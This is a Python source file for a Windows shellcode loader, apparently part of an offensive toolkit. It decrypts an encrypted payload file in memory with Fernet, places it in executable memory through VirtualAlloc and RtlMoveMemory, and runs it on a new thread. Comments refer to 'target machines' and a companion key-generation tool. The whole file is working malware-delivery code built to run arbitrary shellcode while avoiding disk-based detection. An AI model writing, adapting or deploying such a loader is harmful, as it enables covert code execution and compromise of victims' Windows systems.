import ctypes
import base64
import sys
# Note: Target machine requires 'cryptography' library
try:
    from cryptography.fernet import Fernet
except ImportError:
    print("[!] Error: 'cryptography' module missing. Install with 'pip install cryptography'")
    sys.exit(1)

# --- CONFIGURATION ---
# Replace these with the outputs from Davoid's Crypt-Keeper
ENCRYPTION_KEY = b'YOUR_GENERATED_KEY_HERE'
ENCRYPTED_PAYLOAD_PATH = "payload.bin.enc"


def run_in_memory():
    try:
        # 1. Load and Decrypt
        if not ENCRYPTION_KEY or ENCRYPTION_KEY == b'YOUR_GENERATED_KEY_HERE':
            print("[-] Error: Encryption key not configured.")
            return

        cipher = Fernet(ENCRYPTION_KEY)
        with open(ENCRYPTED_PAYLOAD_PATH, "rb") as f:
            encrypted_data = f.read()

        # Decrypting directly into a variable (RAM)
        shellcode = cipher.decrypt(encrypted_data)

        # 2. Allocate memory in the current process
        # This uses Windows API to create a space that is Executable
        # 0x3000 = MEM_COMMIT | MEM_RESERVE
        # 0x40 = PAGE_EXECUTE_READWRITE
        ptr = ctypes.windll.kernel32.VirtualAlloc(
            ctypes.c_int(0),
            ctypes.c_int(len(shellcode)),
            ctypes.c_int(0x3000),
            ctypes.c_int(0x40)
        )

        # 3. Move shellcode into the allocated memory
        buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
        ctypes.windll.kernel32.RtlMoveMemory(
            ctypes.c_int(ptr),
            buf,
            ctypes.c_int(len(shellcode))
        )

        # 4. Create a thread to run the code
        handle = ctypes.windll.kernel32.CreateThread(
            ctypes.c_int(0),
            ctypes.c_int(0),
            ctypes.c_int(ptr),
            ctypes.c_int(0),
            ctypes.c_int(0),
            ctypes.pointer(ctypes.c_int(0))
        )

        # 5. Wait for the thread to finish
        ctypes.windll.kernel32.WaitForSingleObject(
            ctypes.c_int(handle), ctypes.c_int(-1))

    except Exception as e:
        print(f"Execution Failed: {e}")


if __name__ == "__main__":
    if sys.platform == "win32":
        run_in_memory()
    else:
        print("[-] Loader designed for Windows targets.")
